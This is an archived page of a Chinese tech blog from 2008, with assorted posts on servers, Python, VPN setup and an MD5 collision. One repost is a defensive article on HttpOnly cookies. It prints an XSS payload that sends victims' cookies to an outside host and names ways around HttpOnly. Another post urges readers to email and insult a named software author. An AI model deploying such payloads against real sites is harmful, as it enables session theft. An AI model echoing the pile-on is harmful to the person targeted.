@@ -1,0 +1,2873 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Est's Blog - archive category</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="This blog is rated&nbsp;&nbsp;R⃣ , viewer discretion is advised" />
+
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="list-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link active">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="card-container side-gutter">
+      <header class="list-header">
+        <p class="list-header-subtext">This blog is rated&nbsp;&nbsp;R⃣ , viewer discretion is advised</p>
+        <!-- <h1 class="list-header-title">Est's Blog</h1> -->
+      </header>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/377"  rel="bookmark" >
+              <h2 class="card-title">微软开始发猛了，IIS性能强过Apache</h2>
+            </a>
+            <p class="card-text"><p>看到<a href="https://groups.google.com/group/python-cn/browse_thread/thread/889e26de6a4a8e71">一个帖子</a>，囧了</p>
+<blockquote><p>apache或许在静态文件处理上比不过lighttpd，但是不会到连iis都不如的地步。<br />所谓iis胜过apache，可能是指文件传输的速度iis比apache要好，那是因为iis用了特定的平台api(TransmitFile)，使<br />用了文件系统级的缓存(ntfs.sys)。 </p><p>IIS确实强过Apache，并不是因为使用了什么特别的api，或者文件系统缓存的原因（想想那个文件系统没有缓存功能？服务器拥有的带宽通常都比不过硬盘的­读取速度），关键是它从IIS 6.0开始HTTP连接就是用系统驱动在<br />内核层处理了，所以性能是惊人的，大概只有Linux的内核级的http服务器kHTTPd可以和它比一比。win2008的IIS 7.0更是因为MS重写了整个TCP/IP栈，性能比IIS 6又有了近50%的提升。 </p></blockquote>
+<p>微软的winsock被很多牛人诟病之后，微软开始发猛做 WinINET 和 驱动级的 http 协议栈 http.sys，看来IIS还真的要在服务器市场有所作为啊</p>
+<p>ps Win2008重写了TCP/IP协议栈，我咋没感觉出来喃？</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-04-02T21:22:01+08:00">2008-04-02</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625610"  rel="bookmark" >
+              <h2 class="card-title">[转贴][XSS]利用httponly提升应用程序安全性</h2>
+            </a>
+            <p class="card-text"><p><a href="https://groups.google.com/group/ph4nt0m/">ph4nt0m</a>社区出<a href="https://groups.google.com/group/ph4nt0m/browse_thread/thread/de88b9a7472fa5b4/">webzine</a>了，顶啊！</p>
+<p>转一篇好文章，<a href="https://groups.google.com/group/ph4nt0m/browse_thread/thread/138221cb9405ac1e">利用httponly提升应用程序安全性</a></p>
+<p>&nbsp;==Ph4nt0m Security Team==</p>
+<p>Issue 0×01, Phile #0×06 of 0×06</p>
+<p>|=—————————————————————————=|<br>
+|=————-=[ 利用httponly提升应用程序安全性 ]=————–=|<br>
+|=—————————————————————————=|<br>
+|=—————————————————————————=|<br>
+|=——————–=[ By 剑心 ]=——————–=|<br>
+|=——————–=[ &lt;root_at_ph4nt0m_dot_org&gt; ]=——————–=|<br>
+|=—————————————————————————=|<br>
+|=—————————————————————————=|</p>
+<p>随着www服务的兴起，越来越多的应用程序转向了B/S结构，这样只需要一个浏览器就可<br>
+以访问各种各样的web服务，但是这样也越来越导致了越来越多的web安全问题。www服务依<br>
+赖于Htpp协议实现，Http是无状态的协议，所以为了在各个会话之间传递信息，就不可避免地<br>
+用到Cookie或者Session等技术来标记访问者的状态，而无论是Cookie还是Session，一般都<br>
+是利用Cookie来实现的（Session其实是在浏览器的Cookie里带了一个Token来标记，服务器<br>
+取得了这个Token并且检查合法性之后就把服务器上存储的对应的状态和浏览器绑定），这样<br>
+就不可避免地安全聚焦到了Cookie上面，只要获得这个Cookie，就可以取得别人的身份，这对<br>
+于入侵者是一件很美妙的事情，特别当获得的Cookie属于管理员等高权限身份者时，危害就<br>
+更大了。在各种web安全问题里，其中xss漏洞就因此显得格外危险。</p>
+<p>对于应用程序来说，一旦存在了xss漏洞就意味着别人可以在你的浏览器中执行任意的<br>
+js脚本，如果应用程序是开源的或者功能是公开的话，别人就可以利用ajax使用这些功能，但<br>
+是过程往往很烦琐，特别是想直接获得别人身份做随意浏览的话困难就更大。而对于不开源<br>
+的应用程序，譬如某些大型站点的web后台（web2.0一个显著的特征就是大量的交互，用户往<br>
+往需要跟后台的管理员交互，譬如Bug汇报，或者信息投递等等），尽管因为交互的存在可能存<br>
+在跨站脚本漏洞，但是因为对后台的不了解，无法构造完美的ajax代码来利用，即使可以用js<br>
+取得后台的代码并回传分析，但是过程同样烦琐而且不隐蔽。这个时候，利用xss漏洞获得<br>
+Cookie或者Session劫持就很有效了，具体分析应用程序的认证，然后使用某些技巧，甚至可<br>
+以即使对方退出程序也一样永久性获得对方的身份。</p>
+<p>那么如何获得Cookie或者Session劫持呢？在浏览器中的document对象中，就储存了<br>
+Cookie的信息，而利用js可以把这里面的Cookie给取出来，只要得到这个Cookie就可以拥有<br>
+别人的身份了。一个很典型的xss攻击语句如下：</p>
+<p>xss exp:</p>
+<p>url=document.top.location.href;<br>
+cookie=document.cookie;<br>
+c=new Image();<br>
+c.src="http://www.loveshell.net/c.php?c="+cookie+"&amp;u="+url;</p>
+<p>一些应用程序考虑到这个问题所在，所以可能会采取浏览器绑定技术，譬如将Cookie和浏览<br>
+器的User-agent绑定，一旦发现修改就认为Cookie失效。这种方法已经证明是无效的，因为<br>
+当入侵者偷得Cookie的同时他肯定已经同时获得了User-agent。还有另外一种比较严格的<br>
+是将Cookie和Remote-addr相绑定（其实就是和IP绑定，但是一些程序取得IP的方法有问题一<br>
+样导致饶过），但是这样就带来很差的用户体验，更换Ip是经常的事，譬如上班与家里就是2个<br>
+IP，所以这种方法往往也不给予采用。所以基于Cookie的攻击方式现在就非常流行，在一些<br>
+web 2.0站点很容易就取到应用程序的管理员身份。</p>
+<p>如何保障我们的敏感Cookie安全呢？通过上面的分析，一般的Cookie都是从document对<br>
+象中获得的，我们只要让敏感Cookie在浏览器document中不可见就行了。很幸运，现在浏览<br>
+器在设置Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一<br>
+旦这个HttpOnly被设置，你在浏览器的document对象中就看不到Cookie了，而浏览器在浏览<br>
+的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去（包括ajax的时候），应用程<br>
+序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对<br>
+于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安<br>
+全也保证了应用。关于HttpOnly说明可以参照<br>
+http://msdn2.microsoft.com/en-us/library/ms533046.aspx。</p>
+<p>给浏览器设置Cookie的头如下：</p>
+<p>Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;name&gt;=&lt;value&gt;]<br>
+[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]<br>
+[; path=&lt;some_path&gt;][; secure][; HttpOnly]</p>
+<p>以php为例，在php 5.2版本时就已经在Setcookie函数加入了对HttpOnly的支持，譬如</p>
+<p>&lt;?php</p>
+<p>setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);</p>
+<p>?&gt;</p>
+<p>就可以设置abc这个cookie，将其设置为HttpOnly，document将不可见这个Cookie。因为<br>
+setcookie函数本质就是个header，所以一样可以使用header来设置HttpOnly。然后再使用<br>
+document.cookie就可以看到已经取不到这个Cookie了。我们用这种方法来保护利例如<br>
+Sessionid，如一些用于认证的auth-cookie，就不用担心身份被人获得了，这对于一些后台程<br>
+序和webmail提升安全性的意义是重大的。再次使用上面的攻击手法时可以看到，已经不能<br>
+获取被我们设置为HttpOnly的敏感Cookie了。</p>
+<p>但是，也可以看到HttpOnly并不是万能的，首先它并不能解决xss的问题，仍然不能抵制<br>
+一些有耐心的黑客的攻击，也不能防止入侵者做ajax提交，甚至一些基于xss的proxy也出现<br>
+了，但是已经可以提高攻击的门槛了，起码xss攻击不是每个脚本小子都能完成的了，而且其<br>
+他的那些攻击手法因为一些环境和技术的限制，并不像Cookie窃取这种手法一样通用。</p>
+<p>HttpOnly也是可能利用一些漏洞或者配置Bypass的，关键问题是只要能取到浏览器发送<br>
+的Cookie头就可以了。譬如以前出现的Http Trace攻击就可以将你的Header里的Cookie回<br>
+显出来，利用ajax或者flash就可以完成这种攻击，这种手法也已经在ajax和flash中获得修<br>
+补。另外一个关于配置或者应用程序上可能Bypass的显著例子就是phpinfo，大家知道<br>
+phpinfo会将浏览器发送的http头回显出来，其中就包括我们保护的auth信息，而这个页面经<br>
+常存在在各种站点上，只要用ajax取phpinfo页面，取出header头对应的部分就可以获得<br>
+Cookie了。一些应用程序的不完善也可能导致header头的泄露，这种攻击方式对于basic验<br>
+证保护的页面一样可以攻击。</p>
+<p>HttpOnly在IE 6以上，Firefox较新版本都得到了比较好的支持，并且在如Hotmail等应<br>
+用程序里都有广泛的使用，并且已经是取得了比较好的安全效果。</p>
+<p>-EOF-</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-26T00:54:38+08:00">2008-03-26</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625596"  rel="bookmark" >
+              <h2 class="card-title">杯葛notepad++！</h2>
+            </a>
+            <p class="card-text"><p>notepad++ 是一个开源的文本编辑工具 <a href="http://notepad-plus.sourceforge.net/">http://notepad-plus.sourceforge.net/</a>，功能就不用说了，今天看到<a href="http://groups.google.com/group/python-cn/browse_thread/thread/69c128c70cb9c353">一件令人气氛的事情</a>，估计最近作者脑袋被门夹了，在sf首页写着B‌o‌y‌c‌o‌t‌t‌ ‌B‌eijing ‌2‌0‌0‌8‌，大家转用<a href="http://www.pspad.com/">PSPad</a>、<a href="http://sourceforge.net/projects/notepad2">notepad2</a>、<a href="http://www.emeditor.com/">EmEditor</a>等软件吧</p>
+<p>作者的邮箱是<a href="mailto:don.h@free.fr">don.h@free.fr</a>，大家看着办吧，当然也可以到notepad++的<a href="http://sourceforge.net/forum/?group_id=95717">论坛</a>里留一句言：notepad++ sucks!</p>
+<p>vim 声明帮助乌干达难民<br>
+而 notepad++ 在声明抵制一个体育赛事</p>
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/03/12.jpg' alt='12.jpg' width="600" height="327"></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-25T18:38:23+08:00">2008-03-25</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625525"  rel="bookmark" >
+              <h2 class="card-title">不同的字符，一样的MD5</h2>
+            </a>
+            <p class="card-text"><div style="width:500px;word-wrap:break-word;">d131dd02c5e6eec4693d9a0698aff95c2fcab5<span style="color:red">0</span>712467eab4004583eb8fb7f8955ad340609f4b30283e4888325<span style="color:red">f</span>1415a085125e8f7cdc99fd91dbd<span style="color:red">7</span>280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080<span style="color:red">2</span>80d1ec69821bcb6a8839396f965<span style="color:red">a</span>b6ff72a70
+<p>d131dd02c5e6eec4693d9a0698aff95c2fcab5<span style="color:red">8</span>712467eab4004583eb8fb7f8955ad340609f4b30283e4888325<span style="color:red">7</span>1415a085125e8f7cdc99fd91dbd<span style="color:red">f</span>280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080<span style="color:red">a</span>80d1ec69821bcb6a8839396f965<span style="color:red">2</span>b6ff72a70</p>
+</div>
+<p>两个字符的MD5都是 edde4181249fea68547c2fd0edd2e22f</p>
+<p>来源：<a href="http://www.mathstat.dal.ca/~selinger/md5collision/">http://www.mathstat.dal.ca/~selinger/md5collision/</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-24T00:27:23+08:00">2008-03-24</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625521"  rel="bookmark" >
+              <h2 class="card-title">[javascript]除了alert之外的对话框</h2>
+            </a>
+            <p class="card-text"><p>一直很奇怪关闭一个Google Groups页面那个对话框是如何弹出来的，现在发现原来是onbeforeunload的返回值，我们不用alert也可以弹对话框啦</p>
+<p><code><font style="font: 10pt Fixedsys; color: #000080;">&lt;script&gt;<br></font><font style="font: 10pt Fixedsys; color: #000000;">window.onbeforeunload&nbsp;=&nbsp;</font><font style="font: 10pt Fixedsys; color: #0A246A;">function</font><font style="font: 10pt Fixedsys; color: #000000;">(event){<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;event&nbsp;=&nbsp;event&nbsp;||&nbsp;window.event;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;event.returnValue&nbsp;=&nbsp;</font><font style="font: 10pt Comic Sans MS; color: #008000;">"您的文章内容还没有进行保存！"</font><font style="font: 10pt Fixedsys; color: #000000;">;<br>
+}<br></font><font style="font: 10pt Fixedsys; color: #000080;">&lt;/script&gt;<br>
+&lt;body&gt;<br></font><font style="font: 10pt Fixedsys; color: #000000;">aaa<br></font><font style="font: 10pt Fixedsys; color: #000080;">&lt;/body&gt;</font></code></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-23T22:30:23+08:00">2008-03-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625499"  rel="bookmark" >
+              <h2 class="card-title">借用django.utils.autoreload实现python程序模块热插拔</h2>
+            </a>
+            <p class="card-text"><p>现代Web服务器应用一个重要的指标是“Uptime”，也就是在线时间。例如一个大型论坛，升级一个功能，如果需要更新配置而重启Web服务器，可能服务就暂停几秒种，几秒种的损失对于Web来说是相当大的，所以我们需要实现模块热插拔。升级一个模块之后，系统自动把内存里的代码更新为最新文件系统上的版本。再举一个例子，假如一个关键业务是一个IM聊天机器人，那么升级一个机器人的功能就不可能让机器人下线再上线。软件系统模块“热插拔”就像硬件的plug ‘n’ play 一样，方便了开发流程，把文件上传到服务器FTP，网站就自动更新。</p>
+<p>实现思路很简单，犯不着去调用文件系统的消息和事件，我们用最原始最简单的办法：用一个单独的线程，隔一段时间遍历当前目录下的 .py 和 .pyc 文件，搜集文件时间属性，如果文件时间属性变化了，则 reload(<em>module</em>)</p>
+<p>其实django内置的开发服务器已经实现了这个功能，你保存一个工程的代码，服务器在不重启的情况下自动刷新，那么秉着“不要重复造轮子”的理念，我们直接用django现有的模块。网上<a href="https://groups.google.com/group/django-users/browse_thread/thread/ac4fc9f8a82e31a2">问</a>了一下，发现是这个模块在起作用： <a href="http://code.djangoproject.com/svn/django/trunk/django/utils/autoreload.py">django.utils.autoreload</a> 。其实retoreload.py也是源自于CherryPy Project的一段代码。</p>
+<p>调用就很简单了</p>
+<p><code><font style="font: 10pt Fixedsys; color: #007F00;">#!/usr/bin/env&nbsp;python<br>
+#coding:utf-8</font></code></p>
+<p><font style="font: 10pt Fixedsys; color: #00007F;">from&nbsp;</font><font style="font: 10pt Fixedsys; color: #000000;">django.utils&nbsp;</font><font style="font: 10pt Fixedsys; color: #00007F;">import&nbsp;</font><font style="font: 10pt Fixedsys; color: #000000;">autoreload</font></p>
+<p><font style="font: 10pt Fixedsys; color: #00007F;">def&nbsp;</font><font style="font: 10pt Fixedsys; color: #007F7F;">main</font><font style="font: 10pt Fixedsys; color: #000000;">():<br>
+&nbsp;&nbsp;&nbsp;&nbsp;</font><font style="font: 10pt Fixedsys; color: #00007F;">print&nbsp;</font><font style="font: 10pt Fixedsys; color: #007F7F;">1</font></p>
+<p><font style="font: 10pt Fixedsys; color: #007F00;">#必须从命令行启动<br></font><font style="font: 10pt Fixedsys; color: #00007F;">if&nbsp;</font><font style="font: 10pt Fixedsys; color: #FF8000;">"__main__"&nbsp;</font><font style="font: 10pt Fixedsys; color: #000000;">==&nbsp;__name__:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;</font><font style="font: 10pt Fixedsys; color: #00007F;">import&nbsp;</font><font style="font: 10pt Fixedsys; color: #000000;">autoreload<br>
+&nbsp;&nbsp;&nbsp;&nbsp;autoreload.main(main)<br></font></p>
+<p>保存为 test.py ，命令行运行 python test.py ，显示 1，说明代码没有问题。好，打开 test.py 修改main()函数为 print 2，保存，发现命令行自动刷新了，显示2。</p>
+<p>如果上面的代码在工程中应用，可以在main()里写不能down的监护进程，然后所有功能通过 from <em>module</em> import <em>class</em> 来实现，要更新一个功能，只需要更新 <em>module</em> 文件，整个服务在不中断的情况下就会自动升级，我们就成功实现了模块热插拔。</p>
+<p>脚本语言的确更加适合Web，如果是C语言开发的系统，每更新一个功能模块都需要编译一次，开发效率真是底下（当然用 .so/ .dll / COM 等技术就比较高级一点了）</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-23T15:32:04+08:00">2008-03-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625471"  rel="bookmark" >
+              <h2 class="card-title">《这里不是斯巴达》囧图</h2>
+            </a>
+            <p class="card-text"><p><a href="http://www.douban.com/subject/2353665/">Meet The Spartans</a>这部片子非常的恶搞了<a href="http://www.rockstargames.com/sanandreas/">GTA:SA</a>、youtube和American Idol</p>
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/03/4.JPG' alt='4.JPG' width="592" height="336"><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/03/3.JPG' alt='3.JPG' width="592" height="336"><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/03/2.JPG' alt='2.JPG' width="592" height="336"><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/03/1.JPG' alt='1.JPG' width="592" height="336"></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-23T00:04:12+08:00">2008-03-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625460"  rel="bookmark" >
+              <h2 class="card-title">太浮躁了，看一篇好文章静静～</h2>
+            </a>
+            <p class="card-text"><p>有一篇很老的文章，讲：<a href="http://norvig.com/21-days.html">花10年的时间学会编程</a></p>
+<blockquote>
+<p>Here's my recipe for programming success:</p>
+<ul>
+<li>Get interested in programming, and do some because it is fun. Make sure<br>
+that it keeps being enough fun so that you will be willing to put in ten<br>
+years.</li>
+<li>Talk to other programmers; read other programs. This is more important<br>
+than any book or training course.</li>
+<li>Program. The best kind of learning is<br>
+<a href="http://www.engines4ed.org/hyperbook/nodes/NODE-120-pg.html"><br>
+learning by doing</a>. To put it more technically, "the maximal level of<br>
+performance for individuals in a given domain is not attained automatically<br>
+as a function of extended experience, but the level of performance can be<br>
+increased even by highly experienced individuals as a result of deliberate<br>
+efforts to improve."<br>
+<a href="http://www2.umassd.edu/swpi/DesignInCS/expertise.html">(p. 366)</a><br>
+and "the most effective learning requires a well-defined task with an<br>
+appropriate difficulty level for the particular individual, informative<br>
+feedback, and opportunities for repetition and corrections of errors." (p.<br>
+20-21) The book <i><br>
+<a href="http://www.amazon.com/exec/obidos/ASIN/0521357349">Cognition in<br>
+Practice: Mind, Mathematics, and Culture in Everyday Life</a></i> is an<br>
+interesting reference for this viewpoint.</li>
+<li>If you want, put in four years at a college (or more at a graduate<br>
+school). This will give you access to some jobs that require credentials,<br>
+and it will give you a deeper understanding of the field, but if you don't<br>
+enjoy school, you can (with some dedication) get similar experience on the<br>
+job. In any case, book learning alone won't be enough. "Computer science<br>
+education cannot make anybody an expert programmer any more than studying<br>
+brushes and pigment can make somebody an expert painter" says Eric Raymond,<br>
+author of <i>The New Hacker's Dictionary</i>. One of the best programmers I<br>
+ever hired had only a High School degree; he's produced a lot of<br>
+<a href="http://www.xemacs.org">great</a> <a href="http://www.mozilla.org"><br>
+software</a>, has his own<br>
+<a href="http://groups.google.com/groups?q=alt.fan.jwz&amp;meta=site%3Dgroups"><br>
+news group</a>, and made enough in stock options to buy his own<br>
+<a href="http://en.wikipedia.org/wiki/DNA_Lounge">nightclub</a>.</li>
+<li>Work on projects with other programmers. Be the best programmer on some<br>
+projects; be the worst on some others. When you're the best, you get to test<br>
+your abilities to lead a project, and to inspire others with your vision.<br>
+When you're the worst, you learn what the masters do, and you learn what<br>
+they don't like to do (because they make you do it for them).</li>
+<li>Work on projects <i>after</i> other programmers. Be involved in<br>
+understanding a program written by someone else. See what it takes to<br>
+understand and fix it when the original programmers are not around. Think<br>
+about how to design your programs to make it easier for those who will<br>
+maintain it after you.</li>
+<li>Learn at least a half dozen programming languages. Include one language<br>
+that supports class abstractions (like Java or C++), one that supports<br>
+functional abstraction (like Lisp or ML), one that supports syntactic<br>
+abstraction (like Lisp), one that supports declarative specifications (like<br>
+Prolog or C++ templates), one that supports coroutines (like Icon or<br>
+Scheme), and one that supports parallelism (like Sisal).</li>
+<li>Remember that there is a "computer" in "computer science". Know how long<br>
+it takes your computer to execute an instruction, fetch a word from memory<br>
+(with and without a cache miss), read consecutive words from disk, and seek<br>
+to a new location on disk. (<a href="#answers">Answers here.</a>)</li>
+<li>Get involved in a language standardization effort. It could be the ANSI<br>
+C++ committee, or it could be deciding if your local coding style will have<br>
+2 or 4 space indentation levels. Either way, you learn about what other<br>
+people like in a language, how deeply they feel so, and perhaps even a<br>
+little about why they feel so.</li>
+<li>Have the good sense to get off the language standardization effort as<br>
+quickly as possible.</li>
+</ul>
+</blockquote>
+<p>大师级人物讲话就是不一样～～咳咳～～～</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-22T20:16:30+08:00">2008-03-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625414"  rel="bookmark" >
+              <h2 class="card-title">Debian下建立PPTP VPN</h2>
+            </a>
+            <p class="card-text"><p>PPTP VPN和OpenVPN的不同之处在于PPTP VPN支持Windows自带的VPN拨号器连接。</p>
+<p>apt-get install pptpd<br>
+vim /etc/pptpd.conf<br>
+修改<br>
+localip 10.5.1.3<br>
+remoteip 10.5.1.241-246<br>
+其中localip要保证和ifconfig里的结果一样<br>
+remoteip是一个网段，要保证被2整除。</p>
+<p>vim /etc/ppp/options<br>
+添加两个DNS<br>
+ms-dns 202.112.14.151<br>
+ms-dns 202.112.14.161</p>
+<p>vim /etc/ppp/chap-secrets<br>
+添加几个VPN帐户，例如这里的alice和bob<br>
+alice pptpd a-strong-password *<br>
+bob pptpd another-strong-password *</p>
+<p>允许forward VPN连接<br>
+vim /etc/sysctrl.conf<br>
+删除 #net.ipv4.conf.default.forwarding=1 这一行前面的 #<br>
+再 vim /etc/init.d/pptpd<br>
+在start后面加上<br>
+<code><font style="font: 10pt Fixedsys; color: #000000;">echo&nbsp;1&nbsp;&gt;&nbsp;/proc/sys/net/ipv4/ip_forward&nbsp;</font></code><br>
+也就是：<br>
+<code><font style="font: 10pt Fixedsys; color: #000000;">case&nbsp;"$1"&nbsp;in<br>
+&nbsp;&nbsp;start)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-n&nbsp;"Starting&nbsp;PPTP&nbsp;Daemon:&nbsp;"<br>
+&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;1&nbsp;&gt;&nbsp;/proc/sys/net/ipv4/ip_forward<br>
+&nbsp;&nbsp;&nbsp;&nbsp;start-stop-daemon&nbsp;–start&nbsp;–quiet&nbsp;–pidfile&nbsp;$PIDFILE&nbsp;–exec&nbsp;$DAEMON&nbsp;\<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–&nbsp;&lt;&nbsp;/dev/null&nbsp;&gt;&nbsp;/dev/null<br>
+&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"pptpd."<br>
+&nbsp;&nbsp;&nbsp;&nbsp;;;<br></font></code></p>
+<p>最后 /etc/init.d/pptpd restart 好了，赶快试试你的VPN是否正常工作</p>
+<p>来源：<a href="http://pigtail.net/nicholas/pptp/">http://pigtail.net/nicholas/pptp/</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-21T17:54:38+08:00">2008-03-21</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625405"  rel="bookmark" >
+              <h2 class="card-title">命令行实现Skype Portable绿色免安装便携2008.3.22TW海峡纪念钻石会员版</h2>
+            </a>
+            <p class="card-text"><p>网上无意中发现了<a href="http://wabewalker.ter.dk/en/tech/Skype_CLI_parameters.php">skype.exe的命令行参数</a>，所以可以轻易实现skype免安装便携版</p>
+<blockquote>
+<p>This is a list of the command line parameters for Skype that I know of:</p>
+<p>/nosplash    Starts Skype without the splash screen.<br>
+/minimized  Starts Skype minimized to the system tray.<br>
+/datapath:”path”    Use alternate path for saving settings etc.<br>
+/removable (Use with /datapath) Don’t persist specified path since it may not be available next time.<br>
+/callto:Skype name or phone no. Calls the specified user or phone number.<br>
+/shutdown   Shuts down Skype.</p>
+<p>Note that parameters can be combined, e.g.: Skype.exe /minimized /nosplash</p>
+<p>All of the parameters above have been tested with Skype Version 2.5.0.151.</p>
+<p>Do you have anything to add to this list? Please let me know by e-mail: supermagle@ter.dk</p>
+</blockquote>
+<p><code>D:\Chat\Skype\Skype.exe /datapath:".\" /minimized</code></p>
+<p>把配置文件保存到当前目录～～～跟无聊的NSIS脚本说bye-bye吧～～</p>
+<p>Update: 看到<a href="http://www.wangtam.com/50226711/eee_portable_c_skype_53245.php">hung</a>也是这么做的</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-21T16:18:35+08:00">2008-03-21</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/625379"  rel="bookmark" >
+              <h2 class="card-title">[XMPP]Openfire不能和Google Talk互通故障解决</h2>
+            </a>
+            <p class="card-text"><p>今年2月份的时候，地球上很多XMPP服务器不能和Google Talk互通了，原因是Google App加入了即时聊天功能。我就碰到这个情况了，今天到处求助，后来Jabber.org的一位成员指点了一下，找到了<a href="http://mail.jabber.org/pipermail/operators/2008-February/000029.html">Google的官方解释</a>。</p>
+<p>例如，dormforce.net申请了Google Apps，邮件托管在Google Apps Standard，自动开启了 即时聊天 功能，Google这一举动实际上破坏了XMPP Federation。我们自己架设了Openfire作为XMPP服务器，Google总是优先连接自家的XMPP服务器，所以 @dormforce.net 就不能和 @gmail.com 的用户互通，和其他XMPP域（例如 @jabber.org 等）则正常</p>
+<p>现在把Google Apps的 即时通讯 disable了，过一会儿再看看是否正常。如果还不正常可以<a href="http://mail.jabber.org/pipermail/operators/2008-February/000058.html">向Google发邮件</a>。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-03-21T01:10:57+08:00">2008-03-21</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/374"  rel="bookmark" >
+              <h2 class="card-title">成都新闻很彪悍 成都人民快乐多</h2>
+            </a>
+            <p class="card-text"><p><a href="http://club.china.com/data/thread/4043/124/30/72/0_1.html">http://club.china.com/data/thread/4043/124/30/72/0_1.html</a></p>
+<p>因为成都的市民们普遍都热心新闻事件而且非常踊跃参与拨打热线电话，所以我们经常<br />
+    可以看见四川几个台的几个节目和成都台的几个台的几个节目都会报道同样的新闻。而<br />
+且有时候因为现场场地限制两家的记者通常就会互相上镜。有时候你觉得看一个新闻觉<br />
+得报道不全面或者视角不佳那么你马上看另一家的新闻节目多半会让你满意。<br />
+<br />
+　　至于外派记者，大家都晓得四川台和成都台的基本都是说四川话哈。而且一般都是<br />
+年轻娃儿些。所以。。。总的来说还是四川台的比较猛一些。。。<br />
+<br />
+　　1、有一次记者去采访一个车祸现场，司机被卡在驾驶室里面动不了，浑身是血，<br />
